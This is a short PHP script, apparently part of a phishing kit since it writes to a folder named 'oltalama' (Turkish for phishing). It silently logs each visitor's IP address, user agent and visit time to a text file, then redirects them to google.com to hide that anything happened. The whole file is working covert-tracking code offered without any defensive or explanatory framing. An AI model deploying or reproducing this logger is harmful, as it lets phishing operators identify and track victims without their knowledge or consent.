<?php
date_default_timezone_set('Europe/Istanbul');
$ac = fopen("oltalama/ip-kayitlar.txt", "a");
$tarih = date('d-m-Y H:i:s', time());
$usr = $_SERVER['HTTP_USER_AGENT'];
$bosluk = "\n";
$bossluk = "\n";
$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
$al = "Ip adresi: " . $ip_address . " USER AGENT > " . $usr . " İslem Tarihi > " . $tarih . $bosluk . $bossluk;
fwrite($ac, $al);
fclose($ac);
$url = "https://google.com";
header("Location: " . $url);
exit();
?>
